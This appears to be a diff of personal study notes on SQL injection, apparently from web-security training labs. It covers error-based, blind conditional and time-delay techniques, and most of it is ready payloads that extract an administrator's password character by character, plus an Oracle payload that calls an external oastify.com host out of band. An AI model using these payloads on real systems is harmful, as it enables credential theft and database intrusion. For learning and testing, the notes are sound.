@@ -205,13 +205,157 @@ SQL Injection
                             PostgreSQL 	SUBSTRING('foobar', 4, 2)
                             MySQL 	    SUBSTRING('foobar', 4, 2) 
 
+    # Visible error-based SQL injection
+        Misconfiguration of the database sometimes results in verbose error messages. 
+        Occasionally, we may be able to induce the application to generate an error message that contains some of the data
+        that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.
 
 
-   
+        we will use CAST() function to achieve this.
+        EX :-  'AND 1=CAST((SELECT password FROM users LIMIT 1 ) AS int)--
+
+        End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
+
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'' (query brecked)
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'--' 
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'AND CAST((SELECT 1)AS int)--' (and should be a boolean value)
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'AND 1=CAST((SELECT 1)AS int)--' 
+        SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'AND 1=CAST((SELECT username from users)AS int)--' (to long query so we will ommit traking id value)
+        SELECT * FROM tracking WHERE id = 'd'AND 1=CAST((SELECT username from users)AS int)--' (but it can return only one row at a time so we will use LIMIT 1)
+        SELECT * FROM tracking WHERE id = ''AND 1=CAST((SELECT password FROM users LIMIT 1 ) AS int)--' 
+
+    # Time delay 
+        Some Time there is no error message or any other information is returned in the application's responses.
+        In this case, we can still exploit the SQL injection vulnerability by triggering conditional time delays.
+        for this we use concatenation (diffrent for diffrent database) technique along with delay/sleep comand 
+
+                        Database	Concatenation operator
+
+                        Oracle	        'foo'||'bar'
+                        Microsoft	    'foo'+'bar'
+                        PostgreSQL	    'foo'||'bar'
+                        MySQL	        'foo' 'bar' [Note the space between the two strings]
+                                        CONCAT('foo','bar')
 
 
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
 
-'and substring((SELECT PASSWORD FROM USERS WHERE USERNAME = 'ADMIN'),1,1)= 'a
+        # these are unconditional time delay payloads
 
-select trackinid from user where tra
+                Oracle	dbms_pipe.receive_message(('a'),10)
+                Microsoft	WAITFOR DELAY '0:0:10'
+                PostgreSQL	SELECT pg_sleep(10)
+                MySQL	SELECT SLEEP(10)
+        
+        ex -  SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'
+              SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'' (query brecked)
+              SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'||pg_sleep(10)
+              SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'||pg_sleep(10)--
+
+        SELECT
+            CASE 
+                WHEN (1=1) THEN 
+                    pg_sleep(10)
+                ELSE 
+                    pg_sleep(0)
+            END
+        7JSDdS8gWfs8cwyH'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
+
+
+
+
+
+        SELECT
+            CASE 
+                WHEN (1=1) THEN 
+                    pg_sleep(10)
+                ELSE 
+                    pg_sleep(0)
+            END
+            FROM users 
+        7JSDdS8gWfs8cwyH'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users )--
+        7JSDdS8gWfs8cwyH'||(SELECT CASE WHEN (Username='Administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users )-- 
+        (We chould cross check by changing the username value and table name for ex user -> userslala)
+
+        7JSDdS8gWfs8cwyH'||(SELECT CASE WHEN (Username='administrator'and length(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+                        '||(SELECT CASE WHEN (Username='administrator'and length(password)=20) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--
+                        '||(SELECT CASE WHEN (Username='administrator'and substring((SELECT password FROM users WHERE username = 'administrator'),1,1)>a) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--
+
+        SELECT
+            CASE 
+                WHEN (Username='Administrator'and length(password)>1) THEN 
+                    pg_sleep(10)
+                ELSE 
+                    pg_sleep(0)
+            END
+            FROM users
+
+
+        SELECT
+            CASE 
+                WHEN (Username='Administrator' and substring(password,1,1)='a') THEN 
+                    pg_sleep(10)
+                ELSE 
+                    pg_sleep(0)
+            END
+            FROM users
+
+        '||(SELECT CASE WHEN (Username='Administrator' and substring(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)
+
+
+        Cookie: TrackingId=VZ2mHUu3m0Lejcf8'||(select case when (username='administrator' and substring(password,§1§,1)='§a§') then pg_sleep(2)else pg_sleep(0)end from users)--;
+
+
+
+
+
+'||SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://jwju1783yig6mbygbrmffsh0wr2iqbe0.oastify.com/"> %remote;]>'),'/l') FROM dual
+
+
+18 ? (isAdult = true) : (isAdult = false);
+hackoff20"?(1=1):(1:1);
+
+
+
+
+## Blind SQL injection with conditional responses
+
+TrackingId=xyz' AND '1'='1
+TrackingId=xyz' AND '1'='2
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>$1$)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+              ' AND (select SUBSTRING(password,$1$,1) from users where username='administrator')='§a§
+
+
+## Visible error-based SQL injection
+'||select case when (1=1) then to_char(1/0) else '' end from dual||'
+
+
+'||(select '' from dual)||'    # concatenation  to check if the query is working or not by changing the value of dual
+'||(select '' from frdeasf)||' # return error so we know the quer is working 
+'||(select '' from users where rownum=1)||' # rownum is used so that we get only on row for correct syntax before concatenation
+'||(select case when (1=1) then to_char(1/0) else '' end from dual)||' # for conditional query
+'||(select case when (1=1) then to_char(1/0) else '' end from users where rownum=1)||' # for conditional query
+'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||' # for conditional query
+'||(select case when (length(password)>1) then to_char(1/0) else '' end from users where username='administrator)||' #geting length of the password 
+
+'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+## Blind SQL injection with time delays
+
+PostgreSQL
+SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'||pg_sleep(10)--
+
+MySQL
+SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'||SLEEP(10)--
+
+Oracle
+SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O'||dbms_pipe.receive_message(('a'),10)--
+
+Microsoft SQL Server
+SELECT * FROM tracking WHERE id = 'iDow024vPWWx1D1O' WAITFOR DELAY '0:0:10'--
+
+
